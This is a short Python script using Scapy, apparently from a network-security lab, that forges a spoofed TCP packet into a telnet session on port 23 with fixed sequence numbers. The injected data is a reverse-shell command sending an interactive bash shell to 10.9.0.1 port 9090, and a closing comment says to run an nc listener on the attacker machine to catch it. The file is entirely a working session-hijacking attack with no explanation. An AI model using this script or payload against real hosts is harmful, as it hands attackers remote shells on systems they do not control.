#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
sport = 42714
dport = 23
tcp = TCP(sport=sport, dport=dport, flags="AP", seq=1847866068, ack=3189174290)
data = "\n /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \n"
pkt = ip/tcp/data
send(pkt, verbose=0)

## run nc -lnv 9090 on the attacker machine to receive the secret